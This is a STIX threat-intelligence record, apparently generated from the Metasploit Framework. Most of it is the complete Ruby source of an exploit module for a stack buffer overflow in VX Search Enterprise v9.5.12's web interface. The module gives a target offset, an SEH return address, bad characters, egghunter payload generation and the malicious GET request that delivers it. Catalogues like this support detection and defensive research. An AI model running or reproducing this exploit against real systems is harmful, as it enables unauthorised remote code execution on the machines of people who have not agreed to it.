{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3f490efb-8fcd-45e4-a360-07aead2e502e",
    "created": "2024-08-14T16:55:04.800125Z",
    "modified": "2024-08-14T16:55:04.80013Z",
    "name": "VX Search Enterprise GET Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the web interface of VX Search Enterprise v9.5.12, caused by improper bounds checking of the request path in HTTP GET requests sent to the built-in web server. This module has been tested successfully on Windows 7 SP1 x86.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/vxsrchs_bof.rb",
            "external_id": "vxsrchs_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VX Search Enterprise GET Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of VX Search Enterprise v9.5.12, caused by\n        improper bounds checking of the request path in HTTP GET requests\n        sent to the built-in web server. This module has been tested\n        successfully on Windows 7 SP1 x86.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Daniel Teixeira'\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x09\\x0a\\x0d\\x20\\x26\",\n          'Space'      => 500\n        },\n      'Targets'        =>\n        [\n          [ 'VX Search Enterprise v9.5.12',\n            {\n              'Offset' => 2488,\n              'Ret'    => 0x10015ffe  # POP # POP # RET [libspp.dll]\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-03-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/'\n    )\n\n    if res && res.code == 200\n      version = res.body[/VX Search Enterprise v[^<]*/]\n      if version\n        vprint_status(\"Version detected: #{version}\")\n        if version =~ /9\\.5\\.12/\n          return Exploit::CheckCode::Appears\n        end\n        return Exploit::CheckCode::Detected\n      end\n    else\n      vprint_error('Unable to determine due to a HTTP connection timeout')\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    eggoptions = {\n      checksum: true,\n      eggtag: rand_text_alpha(4, payload_badchars)\n    }\n\n    hunter, egg = generate_egghunter(\n      payload.encoded,\n      payload_badchars,\n      eggoptions\n    )\n\n    sploit =  rand_text_alpha(target['Offset'])\n    sploit << generate_seh_record(target.ret)\n    sploit << hunter\n    sploit << make_nops(10)\n    sploit << egg\n    sploit << rand_text_alpha(5500)\n\n    print_status('Sending request...')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => sploit\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-15",
    "x_mitre_platforms": [
        "win'"
    ]
}